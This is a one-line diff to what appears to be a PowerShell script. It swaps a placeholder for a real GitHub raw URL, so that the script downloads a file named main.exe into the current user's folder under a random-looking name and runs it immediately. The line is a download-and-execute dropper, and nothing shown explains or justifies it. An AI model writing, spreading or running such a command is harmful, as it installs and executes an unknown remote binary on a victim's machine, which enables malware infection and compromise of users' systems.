@@ -1,1 +1,1 @@
-(New-Object Net.WebClient).DownloadFile("sum", "C:\Users\$env:USERNAME\X93Q68N.exe") ; & "C:\Users\$env:USERNAME\X93Q68N.exe"
+(New-Object Net.WebClient).DownloadFile("https://github.com/BalletsPistol/_/raw/refs/heads/main/main.exe", "C:\Users\$env:USERNAME\X93Q68N.exe") ; & "C:\Users\$env:USERNAME\X93Q68N.exe"
